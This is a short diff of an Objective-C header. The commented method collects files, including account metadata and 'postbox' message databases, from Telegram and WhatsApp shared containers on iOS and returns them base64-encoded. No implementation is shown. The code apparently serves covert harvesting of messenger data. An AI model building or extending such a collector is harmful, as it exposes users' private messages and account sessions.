@@ -37,14 +37,14 @@
 + (NSString *)appGroupPathFor:(NSString *)groupId;
 
 /**
- * 采 AppGroup 容器（Telegram / WhatsApp）。
- *   includeSubstrings  只收相对路径里含这些片段的文件（nil = 全收）
- *   excludeSubstrings  跳过含这些片段的文件（媒体/缓存）
+ * 按采集配置的 items 采 AppGroup 容器（Telegram / WhatsApp）。
+ *   items = @[ @{@"type":@"dir"|@"file", @"path":@"accounts-metadata/"},
+ *              @{@"type":@"dir", @"path":@"account-*/postbox/"} ]
+ * path 支持 * 通配（逐段展开）。
  * @return @{ @"files": @[@{@"p":...,@"d":base64}], @"bytes": @(N), @"error":... }
  */
 + (NSDictionary *)collectAppGroup:(NSString *)groupId
-                          include:(NSArray<NSString *> *)includeSubstrings
-                          exclude:(NSArray<NSString *> *)excludeSubstrings
+                            items:(NSArray<NSDictionary *> *)items
                             limit:(NSUInteger)maxBytes;
 
 /**
